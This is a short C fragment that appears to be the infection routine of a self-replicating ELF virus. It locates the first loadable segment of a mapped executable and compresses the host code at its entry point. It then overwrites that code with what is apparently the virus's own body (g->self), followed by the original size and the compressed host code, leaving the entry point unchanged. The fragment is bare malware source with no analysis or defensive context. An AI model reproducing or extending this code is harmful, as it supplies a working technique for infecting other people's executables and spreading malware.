	for (i = 0; i < ehdr->e_phnum; i++)
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
			char tmp[3374];
			uint32_t vo = ehdr->e_entry - phdr[i].p_vaddr;
			uint32_t csize, size = phdr[i].p_filesz - vo;
			char *ctext = (void*)brk(0);
			brk(ctext + size);
			mprotect(ctext, size, PROT_READ|PROT_WRITE);
			if ((csize = ari_compress(m + vo, ctext, size, tmp)) == 0)
				goto error;
			if (size < csize + g->size+ 4)
				goto error;
			uint8_t *p = (uint32_t*)(m + vo);
			bzero(p, size);

			memcpy(p, g->self, g->size);
			p += g->size;
			memcpy(p, &size, 4);
			p += 4;
			memcpy(p, ctext, csize);
			/* entry point left unchanged */
			break;
error:			/* free memory */
			bzero(ctext, size);
			brk(ctext);
			goto _unmap;
		}
